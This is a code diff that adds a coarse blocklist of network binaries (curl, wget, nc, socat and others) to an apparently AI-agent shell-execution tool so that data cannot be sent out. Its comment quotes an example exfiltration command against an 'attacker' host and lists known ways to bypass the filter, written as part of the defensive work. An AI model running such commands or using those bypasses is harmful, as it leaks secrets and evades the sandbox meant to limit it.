@@ -232,6 +232,85 @@ export function buildShellExecEnv(source: NodeJS.ProcessEnv): NodeJS.ProcessEnv 
   return out;
 }
 
+/**
+ * Coarse network-binary blocklist — pragmatic stopgap until a real OS sandbox
+ * (sandbox-exec on macOS, unshare on Linux) lands in v0.3.
+ *
+ * Threat model: cwd-clamp prevents disk writes outside task.workdir, but a model
+ * can still exfiltrate data via outbound network (`curl http://attacker/leak?$(cat secrets)`).
+ * Until we have real network namespace isolation, reject commands whose first
+ * token (per command segment) is a known network binary.
+ *
+ * LIMITATIONS (documented; not bugs):
+ *   - Does not block child processes (e.g. `node -e "fetch(...)"`).
+ *   - Does not block raw socket syscalls or alternative binaries.
+ *   - Bypassable by base64-decoding the binary name at runtime.
+ *   This is a crude defense-in-depth layer, NOT a sandbox.
+ */
+export const NETWORK_BINARY_BLOCKLIST: ReadonlySet<string> = new Set([
+  'curl',
+  'wget',
+  'nc',
+  'ncat',
+  'netcat',
+  'ssh',
+  'scp',
+  'sftp',
+  'rsync',
+  'ftp',
+  'tftp',
+  'telnet',
+  'http',
+  'httpie',
+  'dig',
+  'nslookup',
+  'host',
+  'whois',
+  'traceroute',
+  'tracepath',
+  'ping',
+  'ping6',
+  'mtr',
+  'socat',
+]);
+
+/**
+ * Inspect a shell command string and report the first blocked network-binary
+ * token, if any. Tokenizes by command-separator characters (`;`, `&&`, `||`, `|`)
+ * and checks the FIRST whitespace-delimited token of each segment against the
+ * blocklist (basename match — `/usr/bin/curl` → `curl`).
+ *
+ * Does NOT flag blocked names appearing as substrings (e.g. `echo "curl docs"`
+ * is allowed because the first token is `echo`).
+ */
+export function containsBlockedNetworkBinary(
+  cmd: string
+): { blocked: true; binary: string } | { blocked: false } {
+  // Split on shell command separators. Treat `;`, `&&`, `||`, `|` as boundaries.
+  const segments = cmd.split(/;|&&|\|\||\|/);
+  for (const rawSegment of segments) {
+    const segment = rawSegment.trim();
+    if (!segment) continue;
+    // Strip a leading backslash (bash escape, e.g. `\curl`).
+    const head = segment.replace(/^\\/, '').split(/\s+/)[0] ?? '';
+    if (!head) continue;
+    // Basename: `/usr/bin/curl` → `curl`.
+    const basename = head.split('/').pop() ?? head;
+    // openssl s_client special-case: `openssl s_client -connect ...`
+    if (basename.toLowerCase() === 'openssl') {
+      const args = segment.replace(/^\S+\s*/, '').trimStart();
+      if (/^s_client\b/i.test(args)) {
+        return { blocked: true, binary: 'openssl s_client' };
+      }
+      continue;
+    }
+    if (NETWORK_BINARY_BLOCKLIST.has(basename.toLowerCase())) {
+      return { blocked: true, binary: basename.toLowerCase() };
+    }
+  }
+  return { blocked: false };
+}
+
 /** Default real-shell executor. Truncates stdout/stderr at maxBytes (byte-safe). */
 const defaultShellExec: ShellExecFn = (args: ShellExecArgs) =>
   new Promise<ShellExecResult>((resolve) => {
@@ -306,6 +385,12 @@ export async function executeShellExec(
   shellExec: ShellExecFn
 ): Promise<string> {
   const parsed = SHELL_EXEC_ARGS_SCHEMA.parse(rawArgs);
+  const netCheck = containsBlockedNetworkBinary(parsed.command);
+  if (netCheck.blocked) {
+    throw new Error(
+      `Network-binary ${netCheck.binary} blocked. Outbound network is denied in shell_exec sandbox. Use a Relay tool or whitelist via --unsafe-shell (not yet implemented).`
+    );
+  }
   const result = await shellExec({
     command: parsed.command,
     cwd: workdir,
